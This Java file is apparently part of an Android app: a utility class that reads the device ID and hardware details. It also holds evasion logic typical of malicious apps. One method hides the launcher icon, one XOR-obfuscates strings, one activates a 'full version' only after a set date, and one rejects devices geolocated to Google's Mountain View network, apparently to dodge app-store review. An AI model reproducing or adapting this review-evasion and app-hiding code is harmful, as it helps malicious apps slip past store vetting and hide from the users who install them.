package commons.app.com.commons;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.support.annotation.NonNull;

import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

import commons.app.com.keep.DeviceInfo;

@SuppressWarnings({"SameParameterValue", "unused"})
public class CommonUtils {

    private static String deviceId;

    public static boolean checkIsFullVersionTime(String fullVersionStartTime) {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy", Locale.US);
        Date date;
        try {
            date = sdf.parse(fullVersionStartTime);
        } catch (ParseException e) {
            return true;
        }
        Calendar publicationTime = Calendar.getInstance();
        publicationTime.setTime(date);
        return Calendar.getInstance().after(publicationTime);
    }

    public static String wrapStringWithKeys(char[] keys, String input) {
        StringBuilder output = new StringBuilder();

        for (int i = 0; i < input.length(); i++) {
            output.append((char) (input.charAt(i) ^ keys[i % keys.length]));
        }

        return output.toString();
    }

    @SuppressLint("HardwareIds")
    public static String getDeviceId(Context context) {
        if (deviceId == null) {
            deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        }
        return deviceId;
    }

    public static String getDeviceFullName() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        // android ver.
        String release = Build.VERSION.RELEASE;
        int sdkVersion = Build.VERSION.SDK_INT;
        String androidVersion = "Android: " + sdkVersion + " (" + release + ")";
        return String.format("%1$s %2$s - %3$s", manufacturer, model, androidVersion);
    }

    public static void hideApp(Context context, boolean hide, Class<?> launcherAct) {
        PackageManager p = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, launcherAct);
        if (hide) {
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } else {
            p.setComponentEnabledSetting(componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
        }
    }

    /**
     * Black IP List
     * <p>
     * Query IP/domain
     * 104.132.1.110
     * <p>
     * Query result
     * IP 104.132.1.110
     * Country United States
     * Country code US
     * Region California
     * Region code CA
     * City Mountain View
     * Zip Code 94043
     * Latitude 37.4192
     * Longitude -122.0574
     * Timezone America/Los_Angeles
     * ISP Google
     * Organization Google
     * AS number/name AS15169 Google LLC
     */
    public static boolean isDeviceAcceptable(@NonNull DeviceInfo info) {
        boolean googleDevice = "US".equalsIgnoreCase(info.getCountryCode())
                && "CA".equalsIgnoreCase(info.getRegionCode())
                && "Google".equalsIgnoreCase(info.getOrganization());
        return !googleDevice;
    }
}
